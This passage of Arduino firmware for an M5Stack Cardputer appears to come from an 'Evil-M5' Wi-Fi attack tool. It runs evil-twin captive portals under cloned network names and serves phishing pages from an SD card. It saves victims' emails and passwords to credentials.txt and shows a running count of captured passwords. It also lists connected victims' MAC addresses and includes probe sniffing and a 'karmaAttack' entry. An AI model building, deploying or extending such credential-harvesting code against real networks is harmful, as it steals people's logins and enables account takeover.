    if (file.isDirectory()) {
      html += "<li>Directory: <a href='/check-sd-file?dir=" + fullPath + "&pass=" + password + "'>" + displayFileName + "</a></li>";
    } else {
      html += "<li>File: <a href='/download-sd-file?filename=" + fullPath + "&pass=" + password + "'>" + displayFileName + "</a> (" + String(file.size()) + " bytes) <a href='#' onclick='confirmDelete(\"" + fullPath + "\")' style='color:red;'>Delete</a></li>";
    }
    file.close();
  }
  html += "</ul>";
  html += "<script>"
          "function confirmDelete(filename) {"
          "  if (confirm('Are you sure you want to delete ' + filename + '?')) {"
          "    window.location.href = '/delete-sd-file?filename=' + filename + '&pass=" + password + "';"
          "  }"
          "}"
          "window.onload = function() {const urlParams = new URLSearchParams(window.location.search);if (urlParams.has('refresh')) {urlParams.delete('refresh');history.pushState(null, '', location.pathname + '?' + urlParams.toString());window.location.reload();}};"
          "</script>";

  return html;
}


void handleSdCardBrowse() {
  String password = server.arg("pass");
  if (password != accessWebPassword) {
    server.send(403, "text/html", "<html><body><p>Unauthorized</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
    return;
  }

  String dirPath = server.arg("dir");
  if (dirPath == "") dirPath = "/";

  File dir = SD.open(dirPath);
  if (!dir || !dir.isDirectory()) {
    server.send(404, "text/html", "<html><body><p>Directory not found.</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
    return;
  }


  String html = "<p><a href='/evil-m5core2-menu'><button style='background-color: #007bff; border: none; color: white; padding: 6px 15px; text-align: center; text-decoration: none; display: inline-block; font-size: 16px; margin: 4px 2px; cursor: pointer;'>Menu</button></a></p>";
  html += getDirectoryHtml(dir, dirPath, accessWebPassword);
  server.send(200, "text/html", html);
  dir.close();
}

void handleFileDownload() {
  String fileName = server.arg("filename");
  if (!fileName.startsWith("/")) {
    fileName = "/" + fileName;
  }
  if (SD.exists(fileName)) {
    File file = SD.open(fileName, FILE_READ);
    if (file) {
      String downloadName = fileName.substring(fileName.lastIndexOf('/') + 1);
      server.sendHeader("Content-Disposition", "attachment; filename=" + downloadName);
      server.streamFile(file, "application/octet-stream");
      file.close();
      return;
    }
  }
  server.send(404, "text/html", "<html><body><p>File not found.</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
}


void handleDownloadAllFiles() {
  String password = server.arg("pass");
  if (password != accessWebPassword) {
    server.send(403, "text/html", "<html><body><p>Unauthorized</p></body></html>");
    return;
  }

  String dirPath = server.arg("dir");
  if (dirPath == "") dirPath = "/";

  File dir = SD.open(dirPath);
  if (!dir || !dir.isDirectory()) {
    server.send(404, "text/html", "<html><body><p>Directory not found.</p></body></html>");
    return;
  }

  String boundary = "MULTIPART_BYTERANGES";

  // Début de la réponse multipart
  String responseHeaders = "HTTP/1.1 200 OK\r\n";
  responseHeaders += "Content-Type: multipart/x-mixed-replace; boundary=" + boundary + "\r\n";
  responseHeaders += "Connection: close\r\n\r\n";
  server.sendContent(responseHeaders);

  while (File file = dir.openNextFile()) {
    if (!file.isDirectory()) {
      String header = "--" + boundary + "\r\n";
      header += "Content-Type: application/octet-stream\r\n";
      header += "Content-Disposition: attachment; filename=\"" + String(file.name()) + "\"\r\n";
      header += "Content-Length: " + String(file.size()) + "\r\n\r\n";
      server.sendContent(header);

      uint8_t buffer[512];
      while (size_t bytesRead = file.read(buffer, sizeof(buffer))) {
        server.client().write(buffer, bytesRead);
      }
      server.sendContent("\r\n");
    }
    file.close();
  }

  // Fin de la réponse multipart
  String footer = "--" + boundary + "--\r\n";
  server.sendContent(footer);

  dir.close();
}


void handleFileUpload() {
  HTTPUpload& upload = server.upload();
  String password = server.arg("pass");
  const size_t MAX_UPLOAD_SIZE = 8192;

  if (password != accessWebPassword) {
    Serial.println("Unauthorized access attempt");
    server.send(403, "text/html", "<html><body><p>Unauthorized</p></body></html>");
    return;
  }

  if (upload.status == UPLOAD_FILE_START) {
    String filename = upload.filename;
    String directory = server.arg("directory");

    if (!directory.startsWith("/")) {
      directory = "/" + directory;
    }

    if (!directory.endsWith("/")) {
      directory += "/";
    }

    String fullPath = directory + filename;

    fsUploadFile = SD.open(fullPath, FILE_WRITE);
    if (!fsUploadFile) {
      Serial.println("Upload start failed: Unable to open file " + fullPath);
      server.send(500, "text/html", "File opening failed");
      return;
    }

    Serial.print("Upload Start: ");
    Serial.println(fullPath);
  } else if (upload.status == UPLOAD_FILE_WRITE) {
    if (fsUploadFile && upload.currentSize > 0 && upload.currentSize <= MAX_UPLOAD_SIZE) {
      size_t written = fsUploadFile.write(upload.buf, upload.currentSize);
      if (written != upload.currentSize) {
        Serial.println("Write Error: Inconsistent data size.");
        fsUploadFile.close();
        server.send(500, "text/html", "File write error");
        return;
      }
    } else {
      if (!fsUploadFile) {
        Serial.println("Error: File is no longer valid for writing.");
      } else if (upload.currentSize > MAX_UPLOAD_SIZE) {
        Serial.println("Error: Data segment size too large.");
        Serial.println(upload.currentSize);
      } else {
        Serial.println("Information: Empty data segment received.");
      }
      return;
    }
  } else if (upload.status == UPLOAD_FILE_END) {
    if (fsUploadFile) {
      fsUploadFile.close();
      Serial.print("Upload End: ");
      Serial.println(upload.totalSize);
      server.send(200, "text/html", "<html><body><p>File successfully uploaded</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
      Serial.println("File successfully uploaded");
    } else {
      server.send(500, "text/html", "File closing error");
      Serial.println("File closing error");
    }
  }
}

void handleListDirectories() {
  String password = server.arg("pass");
  if (password != accessWebPassword) {
    server.send(403, "text/plain", "Unauthorized");
    return;
  }

  File root = SD.open("/");
  String dirList = "";

  while (File file = root.openNextFile()) {
    if (file.isDirectory()) {
      dirList += String(file.name()) + "\n";
    }
    file.close();
  }
  root.close();
  server.send(200, "text/plain", dirList);
}

void listDirectories(File dir, String path, String & output) {
  while (File file = dir.openNextFile()) {
    if (file.isDirectory()) {
      output += String(file.name()) + "\n";
      listDirectories(file, String(file.name()), output);
    }
    file.close();
  }
}


void handleFileDelete() {
  String password = server.arg("pass");
  if (password != accessWebPassword) {
    server.send(403, "text/html", "<html><body><p>Unauthorized</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
    return;
  }

  String fileName = server.arg("filename");
  if (!fileName.startsWith("/")) {
    fileName = "/" + fileName;
  }
  if (SD.exists(fileName)) {
    if (SD.remove(fileName)) {
      server.send(200, "text/html", "<html><body><p>File deleted successfully</p><script>setTimeout(function(){window.location = document.referrer + '&refresh=true';}, 2000);</script></body></html>");
      Serial.println("-------------------");
      Serial.println("File deleted successfully");
      Serial.println("-------------------");
    } else {
      server.send(500, "text/html", "<html><body><p>File could not be deleted</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
      Serial.println("-------------------");
      Serial.println("File could not be deleted");
      Serial.println("-------------------");
    }
  } else {
    server.send(404, "text/html", "<html><body><p>File not found</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
    Serial.println("-------------------");
    Serial.println("File not found");
    Serial.println("-------------------");
  }
}

void servePortalFile(const String & filename) {

  File webFile = SD.open(filename);
  if (webFile) {
    server.streamFile(webFile, "text/html");
    /*Serial.println("-------------------");
      Serial.println("serve portal.");
      Serial.println("-------------------");*/
    webFile.close();
  } else {
    server.send(404, "text/html", "<html><body><p>File not found</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
  }
}

void saveCredentials(const String & email, const String & password, const String & portalName, const String & clonedSSID) {
  File file = SD.open("/credentials.txt", FILE_APPEND);
  if (file) {
    file.println("-- Email -- \n" + email);
    file.println("-- Password -- \n" + password);
    file.println("-- Portal -- \n" + portalName); // Ajout du nom du portail
    file.println("-- SSID -- \n" + clonedSSID); // Ajout du SSID cloné
    file.println("------------------");
    file.close();
    Serial.println("-------------------");
    Serial.println(" !!! Credentials " + email + ":" + password + " saved !!! ");
    Serial.println("On Portal Name: " + portalName);
    Serial.println("With Cloned SSID: " + clonedSSID);
    Serial.println("-------------------");
  } else {
    Serial.println("Error opening file for writing");
  }
}




void stopCaptivePortal() {
  dnsServer.stop();
  server.stop();
  WiFi.mode(WIFI_MODE_APSTA);
  WiFi.softAPdisconnect(true);
  isCaptivePortalOn = false;
  Serial.println("-------------------");
  Serial.println("Portal Stopped");
  Serial.println("-------------------");
  if (ledOn) {
    pixels.setPixelColor(0, pixels.Color(255, 0, 0));
    pixels.show();
    delay(250);
    pixels.setPixelColor(0, pixels.Color(0, 0, 0));
    pixels.show();
  }
  waitAndReturnToMenu("  Portal Stopped");
}

void listPortalFiles() {
  File root = SD.open("/sites");
  numPortalFiles = 0;
  Serial.println("Available portals:");
  while (File file = root.openNextFile()) {
    if (!file.isDirectory()) {
      String fileName = file.name();
      if (fileName.endsWith(".html")) {
        portalFiles[numPortalFiles] = String("/sites/") + fileName;

        Serial.print(numPortalFiles);
        Serial.print(": ");
        Serial.println(fileName);

        numPortalFiles++;
        if (numPortalFiles >= 30) break; // max 30 files
      }
    }
    file.close();
  }
  root.close();
}


void serveChangePasswordPage() {
  String password = server.arg("pass");
  if (password != accessWebPassword) {
    server.send(403, "text/html", "<html><body><p>Unauthorized</p></body></html>");
    return;
  }

  String html = "<html><head><style>";
  html += "body { background-color: #333; color: white; font-family: Arial, sans-serif; text-align: center; padding-top: 50px; }";
  html += "form { background-color: #444; padding: 20px; border-radius: 8px; display: inline-block; }";
  html += "input[type='password'], input[type='submit'] { width: 80%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; }";
  html += "input[type='submit'] { background-color: #008CBA; color: white; cursor: pointer; }";
  html += "input[type='submit']:hover { background-color: #005F73; }";
  html += "</style></head><body>";
  html += "<form action='/Change-Portal-Password-demand' method='get'>";
  html += "<input type='hidden' name='pass' value='" + password + "'>";
  html += "<h2>Change Portal Password</h2>";
  html += "New Password: <br><input type='password' name='newPassword'><br>";
  html += "<input type='submit' value='Change Password'>";
  html += "</form><br>Leave empty for an open AP.<br>Remember to deploy the portal again after changing the password.<br></body></html>";
  server.send(200, "text/html", html);
}



void handleChangePassword() {
  server.on("/Change-Portal-Password-demand", HTTP_GET, []() {
    String password = server.arg("pass");
    if (password != accessWebPassword) {
      server.send(403, "text/html", "<html><body><p>Unauthorized</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
      return;
    }

    String newPassword = server.arg("newPassword");
    captivePortalPassword = newPassword;
    server.send(200, "text/html", "<html><body><p>Password Changed Successfully !!</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
  });

  serveChangePasswordPage();
}



void changePortal() {
  listPortalFiles();
  const int listDisplayLimit = M5.Display.height() / 12;
  bool needDisplayUpdate = true;
  bool keyHandled = false;  // Pour gérer la réponse à la touche une fois

  unsigned long lastKeyPressTime = 0;
  const unsigned long debounceDelay = 200; // Temps en millisecondes pour ignorer les pressions supplémentaires

  // Attendre que la touche KEY_ENTER soit relâchée avant de continuer
  enterDebounce();

  while (!inMenu) {
    if (needDisplayUpdate) {
      int listStartIndex = max(0, min(portalFileIndex, numPortalFiles - listDisplayLimit));

      M5.Display.clear();
      M5.Display.setTextSize(1.5);
      M5.Display.setTextColor(TFT_WHITE);
      M5.Display.setCursor(10, 10);

      for (int i = listStartIndex; i < min(numPortalFiles, listStartIndex + listDisplayLimit); i++) {
        int lineHeight = 12; // Espacement réduit entre les lignes
        if (i == portalFileIndex) {
          M5.Display.fillRect(0, (i - listStartIndex) * lineHeight, M5.Display.width(), lineHeight, TFT_NAVY);
          M5.Display.setTextColor(TFT_GREEN);
        } else {
          M5.Display.setTextColor(TFT_WHITE);
        }
        M5.Display.setCursor(10, (i - listStartIndex) * lineHeight);
        M5.Display.println(portalFiles[i].substring(7));
      }
      M5.Display.display();
      needDisplayUpdate = false;
    }

    M5.update();
    M5Cardputer.update();

    if (millis() - lastKeyPressTime > debounceDelay) {
      if (M5Cardputer.Keyboard.isKeyPressed(';') && !keyHandled) {
        portalFileIndex = (portalFileIndex - 1 + numPortalFiles) % numPortalFiles;
        needDisplayUpdate = true;
        lastKeyPressTime = millis();
      } else if (M5Cardputer.Keyboard.isKeyPressed('.') && !keyHandled) {
        portalFileIndex = (portalFileIndex + 1) % numPortalFiles;
        needDisplayUpdate = true;
        lastKeyPressTime = millis();
      } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) && !keyHandled) {
        selectedPortalFile = portalFiles[portalFileIndex];
        inMenu = true;
        Serial.println("-------------------");
        Serial.println(selectedPortalFile.substring(7) + " portal selected.");
        Serial.println("-------------------");
        waitAndReturnToMenu(selectedPortalFile.substring(7) + " selected");
        break; // Sortir de la boucle
      } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
        inMenu = true;
        drawMenu();
        break;
      }

      // Réinitialiser la gestion des touches une fois aucune n'est pressée
      if (!M5Cardputer.Keyboard.isKeyPressed(';') &&
          !M5Cardputer.Keyboard.isKeyPressed('.') &&
          !M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
        keyHandled = false;
      }
    }
  }
}






String credentialsList[100]; // max 100 lignes parsed
int numCredentials = 0;

void readCredentialsFromFile() {
  File file = SD.open("/credentials.txt");
  if (file) {
    numCredentials = 0;
    while (file.available() && numCredentials < 100) {
      credentialsList[numCredentials++] = file.readStringUntil('\n');
    }
    file.close();
  } else {
    Serial.println("Error opening file");
  }
}


void checkCredentials() {
  readCredentialsFromFile(); // Assume this populates a global array or vector with credentials

  // Initial display setup
  int currentListIndex = 0;
  bool needDisplayUpdate = true;

  enterDebounce();
  unsigned long lastKeyPressTime = 0;
  const unsigned long debounceDelay = 200; // Temps en millisecondes pour ignorer les pressions supplémentaires

  while (true) {
    if (needDisplayUpdate) {
      displayCredentials(currentListIndex); // Function to display credentials on the screen
      needDisplayUpdate = false;
    }

    M5.update();
    M5Cardputer.update();
    handleDnsRequestSerial(); // Handle any background tasks

    if (millis() - lastKeyPressTime > debounceDelay) {
      if (M5Cardputer.Keyboard.isKeyPressed(';')) {
        currentListIndex = max(0, currentListIndex - 1);
        needDisplayUpdate = true;
        lastKeyPressTime = millis();
      } else if (M5Cardputer.Keyboard.isKeyPressed('.')) {
        currentListIndex = min(numCredentials - 1, currentListIndex + 1);
        needDisplayUpdate = true;
        lastKeyPressTime = millis();
      } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
        break; // Exit the loop to return to the menu
      } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
        inMenu = true;
        drawMenu();
        break;
      }
    }
  }
  // Return to menu
  inMenu = true; // Assuming this flag controls whether you're in the main menu
  drawMenu(); //the main menu
}


void displayCredentials(int index) {
  // Clear the display and set up text properties
  M5.Display.clear();
  M5.Display.setTextSize(1.5);

  const int lineHeight = 15; // Réduire l'espace entre les lignes
  int maxVisibleLines = 9; // Nombre maximum de lignes affichables à l'écran
  int currentLine = 0; // Ligne actuelle en cours de traitement
  int firstLineIndex = index; // Index de la première ligne de l'entrée sélectionnée
  int linesBeforeIndex = 0; // Nombre de lignes avant l'index sélectionné

  // Calculer combien de lignes sont nécessaires avant l'index sélectionné
  for (int i = 0; i < index; i++) {
    int neededLines = 1 + M5.Display.textWidth(credentialsList[i]) / (M5.Display.width() - 20);
    linesBeforeIndex += neededLines;
  }

  // Ajuster l'index de la première ligne si nécessaire pour s'assurer que l'entrée sélectionnée est visible
  while (linesBeforeIndex > 0 && linesBeforeIndex + maxVisibleLines - 1 < index) {
    linesBeforeIndex--;
    firstLineIndex--;
  }

  // Afficher les entrées de credentials visibles
  for (int i = firstLineIndex; currentLine < maxVisibleLines && i < numCredentials; i++) {
    String credential = credentialsList[i];
    int neededLines = 1 + M5.Display.textWidth(credential) / (M5.Display.width() - 20);

    if (i == index) {
      M5.Display.fillRect(0, currentLine * lineHeight, M5.Display.width(), lineHeight * neededLines, TFT_NAVY);
    }

    for (int line = 0; line < neededLines; line++) {
      M5.Display.setCursor(10, (currentLine + line) * lineHeight);
      M5.Display.setTextColor(i == index ? TFT_GREEN : TFT_WHITE);

      int startChar = line * (credential.length() / neededLines);
      int endChar = min(credential.length(), startChar + (credential.length() / neededLines));
      M5.Display.println(credential.substring(startChar, endChar));
    }

    currentLine += neededLines;
  }

  M5.Display.display();
}

bool confirmPopup(String message) {
  bool confirm = false;
  bool decisionMade = false;

  M5.Display.clear();
  M5.Display.setTextSize(1.5);
  int messageWidth = message.length() * 9;  // Each character is 6 pixels wide
  int startX = (M5.Display.width() - messageWidth) / 2;  // Calculate starting X position

  M5.Display.setCursor(startX, M5.Display.height() / 2);
  M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
  M5.Display.println(message);

  M5.Display.setTextColor(TFT_GREEN);
  M5.Display.setCursor(60, 110);
  M5.Display.print("Y");

  M5.Display.setTextColor(TFT_RED);
  M5.Display.setCursor(M5.Display.width() - 60, 110);
  M5.Display.print("N");

  M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
  M5.Display.display();

  while (!decisionMade) {
    M5.update();
    M5Cardputer.update();

    if (M5Cardputer.Keyboard.isKeyPressed('y')) {
      confirm = true;
      decisionMade = true;
    } else if (M5Cardputer.Keyboard.isKeyPressed('n')) {
      confirm = false;
      decisionMade = true;
    }
  }

  return confirm;
}



void deleteCredentials() {
  if (confirmPopup("Delete credentials?")) {
    File file = SD.open("/credentials.txt", FILE_WRITE);
    if (file) {
      file.close();
      Serial.println("-------------------");
      Serial.println("credentials.txt deleted");
      Serial.println("-------------------");
      waitAndReturnToMenu("Deleted successfully");
      Serial.println("Credentials deleted successfully");
    } else {
      Serial.println("-------------------");
      Serial.println("Error deleteting credentials.txt ");
      Serial.println("-------------------");
      waitAndReturnToMenu("Error..");
      Serial.println("Error opening file for deletion");
    }
  } else {
    waitAndReturnToMenu("Deletion cancelled");
  }
}


int countPasswordsInFile() {
  File file = SD.open("/credentials.txt");
  if (!file) {
    Serial.println("Error opening credentials file for reading");
    return 0;
  }

  int passwordCount = 0;
  while (file.available()) {
    String line = file.readStringUntil('\n');
    if (line.startsWith("-- Password")) {
      passwordCount++;
    }
  }

  file.close();
  return passwordCount;
}


int oldNumClients = -1;
int oldNumPasswords = -1;
bool wificonnected = false;
String wificonnectedPrint = "";
String ipAddress = "";
void displayMonitorPage1() {
  M5.Display.clear();
  M5.Display.setTextSize(1.5);
  M5.Lcd.setTextColor(TFT_WHITE, TFT_BLACK);

  if (WiFi.localIP().toString() != "0.0.0.0") {
    wificonnected = true;
    wificonnectedPrint = "Y";
    ipAddress = WiFi.localIP().toString();
  } else {
    wificonnected = false;
    wificonnectedPrint = "N";
    ipAddress = "           ";
  }
  M5.Display.setCursor(0, 45);
  M5.Display.println("SSID: " + clonedSSID);
  M5.Display.setCursor(0, 60);
  M5.Display.println("Portal: " + String(isCaptivePortalOn ? "On" : "Off"));
  M5.Display.setCursor(0, 75);
  M5.Display.println("Page: " + selectedPortalFile.substring(7));
  M5.Display.setCursor(0, 90);
  M5.Display.println("Connected : " + wificonnectedPrint);
  M5.Display.setCursor(0, 105);
  M5.Display.println("IP : " + ipAddress);

  oldNumClients = -1;
  oldNumPasswords = -1;

  M5.Display.display();

  // Attendre que la touche KEY_ENTER soit relâchée avant de continuer
  enterDebounce();

  unsigned long lastKeyPressTime = 0;
  const unsigned long debounceDelay = 200; // Temps en millisecondes pour ignorer les pressions supplémentaires
  while (M5Cardputer.Keyboard.isKeyPressed(',') ||
         M5Cardputer.Keyboard.isKeyPressed('/') ||
         M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
    M5.update();
    M5Cardputer.update();
    delay(10);  // Small delay to reduce CPU load
  }
  while (!inMenu) {
    M5.update();
    M5Cardputer.update();
    handleDnsRequestSerial();
    server.handleClient();

    int newNumClients = WiFi.softAPgetStationNum();
    int newNumPasswords = countPasswordsInFile();

    if (newNumClients != oldNumClients) {
      M5.Display.fillRect(0, 15, 50, 10, TFT_BLACK);
      M5.Display.setCursor(0, 15);
      M5.Display.println("Clients: " + String(newNumClients));
      oldNumClients = newNumClients;
    }

    if (newNumPasswords != oldNumPasswords) {
      M5.Display.fillRect(0, 30, 50, 10, TFT_BLACK);
      M5.Display.setCursor(0, 30);
      M5.Display.println("Passwords: " + String(newNumPasswords));
      oldNumPasswords = newNumPasswords;
    }

    if (millis() - lastKeyPressTime > debounceDelay) {
      if (M5Cardputer.Keyboard.isKeyPressed(',')) {
        displayMonitorPage3();  // Navigate to the last page
        break;
      } else if (M5Cardputer.Keyboard.isKeyPressed('/')) {
        displayMonitorPage2();  // Navigate to the next page
        break;
      } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
        inMenu = true;
        drawMenu();
        break;
      }
      lastKeyPressTime = millis();  // Reset debounce timer
    }
  }
}


void updateConnectedMACs() {
  wifi_sta_list_t stationList;
  tcpip_adapter_sta_list_t adapterList;
  esp_wifi_ap_get_sta_list(&stationList);
  tcpip_adapter_get_sta_list(&stationList, &adapterList);

  for (int i = 0; i < adapterList.num; i++) {
    char macStr[18];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             adapterList.sta[i].mac[0], adapterList.sta[i].mac[1], adapterList.sta[i].mac[2],
             adapterList.sta[i].mac[3], adapterList.sta[i].mac[4], adapterList.sta[i].mac[5]);
    macAddresses[i] = String(macStr);
  }
}
void displayMonitorPage2() {
  M5.Display.clear();
  M5.Display.setTextSize(1.5);
  M5.Lcd.setTextColor(TFT_WHITE, TFT_BLACK);
  updateConnectedMACs();

  if (macAddresses[0] == "") {
    M5.Display.setCursor(0, 15);
    M5.Display.println("No client connected");
    Serial.println("----Mac-Address----");
    Serial.println("No client connected");
    Serial.println("-------------------");
  } else {
    Serial.println("----Mac-Address----");
    for (int i = 0; i < 10; i++) {
      int y = 30 + i * 20;
      if (y > M5.Display.height() - 20) break;

      M5.Display.setCursor(10, y);
      M5.Display.println(macAddresses[i]);
      Serial.println(macAddresses[i]);
    }
    Serial.println("-------------------");
  }

  M5.Display.display();

  unsigned long lastKeyPressTime = 0;
  const unsigned long debounceDelay = 200; // Debounce delay in milliseconds
  while (M5Cardputer.Keyboard.isKeyPressed(',') ||
         M5Cardputer.Keyboard.isKeyPressed('/') ||
         M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
    M5.update();
    M5Cardputer.update();
    delay(10);  // Small delay to reduce CPU load
  }
  while (!inMenu) {
    M5.update();
    M5Cardputer.update();
    handleDnsRequestSerial();

    if (millis() - lastKeyPressTime > debounceDelay) {
      if (M5Cardputer.Keyboard.isKeyPressed(',')) {
        displayMonitorPage1();  // Navigate back to the first page
        break;
      } else if (M5Cardputer.Keyboard.isKeyPressed('/')) {
        displayMonitorPage3();  // Navigate to the next page
        break;
      } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
        inMenu = true;
        drawMenu();
        break;
      }
      lastKeyPressTime = millis();  // Reset debounce timer
    }
  }
}


String oldStack = "";
String oldRamUsage = "";
String oldBatteryLevel = "";
String oldTemperature = "";

String getBatteryLevel() {

  if (M5.Power.getBatteryLevel() < 0) {

    return String("error");
  } else {
    return String(M5.Power.getBatteryLevel());
  }
}

String getTemperature() {
  float temperature;
  M5.Imu.getTemp(&temperature);
  int roundedTemperature = round(temperature);
  return String(roundedTemperature);
}

String getStack() {
  UBaseType_t stackWordsRemaining = uxTaskGetStackHighWaterMark(NULL);
  return String(stackWordsRemaining * 4 / 1024.0);
}

String getRamUsage() {
  float heapSizeInMegabytes = esp_get_free_heap_size() / 1048576.0;
  char buffer[10];
  sprintf(buffer, "%.2f", heapSizeInMegabytes);
  return String(buffer);
}

unsigned long lastUpdateTime = 0;
const long updateInterval = 1000;

void displayMonitorPage3() {
  M5.Display.clear();
  M5.Display.setTextSize(1.5);
  M5.Lcd.setTextColor(TFT_WHITE, TFT_BLACK);

  oldStack = getStack();
  oldRamUsage = getRamUsage();
  oldBatteryLevel = getBatteryLevel();

  M5.Display.setCursor(10 / 4, 15);
  M5.Display.println("Stack left: " + oldStack + " Kb");
  M5.Display.setCursor(10 / 4, 30);
  M5.Display.println("RAM: " + oldRamUsage + " Mo");
  M5.Display.setCursor(10 / 4, 45);
  M5.Display.println("Batterie: " + oldBatteryLevel + "%");

  M5.Display.display();
  lastUpdateTime = millis();

  oldStack = "";
  oldRamUsage = "";
  oldBatteryLevel = "";

  M5.Display.display();

  unsigned long lastKeyPressTime = 0;
  const unsigned long debounceDelay = 200; // Debounce delay in milliseconds
  while (M5Cardputer.Keyboard.isKeyPressed(',') ||
         M5Cardputer.Keyboard.isKeyPressed('/') ||
         M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
    M5.update();
    M5Cardputer.update();
    delay(10);  // Small delay to reduce CPU load
  }

  while (!inMenu) {
    M5.update();
    M5Cardputer.update();
    handleDnsRequestSerial();

    unsigned long currentMillis = millis();

    if (currentMillis - lastUpdateTime >= updateInterval) {
      // Récupérer les nouvelles valeurs
      String newStack = getStack();
      String newRamUsage = getRamUsage();
      String newBatteryLevel = getBatteryLevel();
      int newBatteryCurrent = M5.Power.getBatteryCurrent();

      // Afficher les valeurs mises à jour
      if (newStack != oldStack) {
        M5.Display.setCursor(10 / 4, 15);
        M5.Display.println("Stack left: " + newStack + " Kb");
        oldStack = newStack;
      }

      if (newRamUsage != oldRamUsage) {
        M5.Display.setCursor(10 / 4, 30);
        M5.Display.println("RAM: " + newRamUsage + " Mo");
        oldRamUsage = newRamUsage;
      }

      if (newBatteryLevel != oldBatteryLevel) {
        M5.Display.setCursor(10 / 4, 45);
        M5.Display.println("Batterie: " + newBatteryLevel + "%");
        oldBatteryLevel = newBatteryLevel;
      }

      lastUpdateTime = currentMillis;
    }

    if (millis() - lastKeyPressTime > debounceDelay) {
      if (M5Cardputer.Keyboard.isKeyPressed(',')) {
        displayMonitorPage2();  // Go back to the second page
        break;
      } else if (M5Cardputer.Keyboard.isKeyPressed('/')) {
        displayMonitorPage1();  // Go back to the first page
        break;
      } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
        inMenu = true;
        drawMenu();
        break;
      }
      lastKeyPressTime = millis();  // Reset debounce timer
    }
  }
}



void probeSniffing() {
  isProbeSniffingMode = true;
  isProbeSniffingRunning = true;
  startScanKarma();

  while (isProbeSniffingRunning) {
    M5.update(); M5Cardputer.update();
    handleDnsRequestSerial();

    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
      stopProbeSniffingViaSerial = false;
      isProbeSniffingRunning = false;
      break;
    }
  }

  stopScanKarma();
  isProbeSniffingMode = false;
  if (stopProbeSniffingViaSerial) {
    stopProbeSniffingViaSerial = false;
  }
}



void karmaAttack() {
  drawStartButtonKarma();
}

void waitAndReturnToMenu(String message) {
  M5.Display.clear();
  M5.Display.setTextSize(1.5);

  int messageWidth = message.length() * 9;  // Each character is 6 pixels wide
  int startX = (M5.Display.width() - messageWidth) / 2;  // Calculate starting X position

  // Set the cursor to the calculated position
  M5.Display.setCursor(startX, M5.Display.height() / 2);
  M5.Display.println(message);
  M5.Display.fillRect(0, M5.Display.height() - 30, M5.Display.width(), 30, TFT_BLACK);

  M5.Display.display();
  delay(1500);
  inMenu = true;
  drawMenu();
}


void loopOptions(std::vector<std::pair<String, std::function<void()>>> &options, bool loop, bool displayTitle, const String &title = "") {
    int currentIndex = 0;
    bool selectionMade = false;
    const int lineHeight = 12;
    const int maxVisibleLines = 8;
    int menuStartIndex = 0;

    M5.Display.clear();
    M5.Display.setTextSize(1.5);
    M5.Display.setTextFont(1);
    enterDebounce();

    for (int i = 0; i < maxVisibleLines; ++i) {
        int optionIndex = menuStartIndex + i;
        if (optionIndex >= options.size()) break;

        if (optionIndex == currentIndex) {
            M5.Display.fillRect(0, 0 + i * lineHeight, M5.Display.width(), lineHeight, TFT_NAVY);
            M5.Display.setTextColor(TFT_GREEN, TFT_NAVY);
        } else {
            M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
        }
        M5.Display.setCursor(0, 0 + i * lineHeight);
        M5.Display.println(options[optionIndex].first);
    }
    M5.Display.display();

    while (!selectionMade) {
        M5.update();
        M5Cardputer.update();

        bool screenNeedsUpdate = false;

        if (M5Cardputer.Keyboard.isKeyPressed(';')) {
            currentIndex = (currentIndex - 1 + options.size()) % options.size();
            menuStartIndex = max(0, min(currentIndex, (int)options.size() - maxVisibleLines));
            screenNeedsUpdate = true;
            delay(150); // anti-rebond
        } else if (M5Cardputer.Keyboard.isKeyPressed('.')) {
            currentIndex = (currentIndex + 1) % options.size();
            menuStartIndex = max(0, min(currentIndex, (int)options.size() - maxVisibleLines));
            screenNeedsUpdate = true;
            delay(150); // anti-rebond
        } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
            options[currentIndex].second();
            if (!loop) {
                selectionMade = true;
            }
        } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
            selectionMade = true;
            delay(150); // anti-rebond
            waitAndReturnToMenu("Back to menu");
        }

        if (screenNeedsUpdate) {
            M5.Display.clear();

            for (int i = 0; i < maxVisibleLines; ++i) {
                int optionIndex = menuStartIndex + i;
                if (optionIndex >= options.size()) break;

                if (optionIndex == currentIndex) {
                    M5.Display.fillRect(0, 0 + i * lineHeight, M5.Display.width(), lineHeight, TFT_NAVY);
                    M5.Display.setTextColor(TFT_GREEN, TFT_NAVY);
                } else {
                    M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
                }
                M5.Display.setCursor(0, 0 + i * lineHeight);
                M5.Display.println(options[optionIndex].first);
            }

            M5.Display.display();
        }

        delay(100);
    }
}

void showSettingsMenu() { 
    std::vector<std::pair<String, std::function<void()>>> options; 

    bool continueSettingsMenu = true;

    while (continueSettingsMenu) {
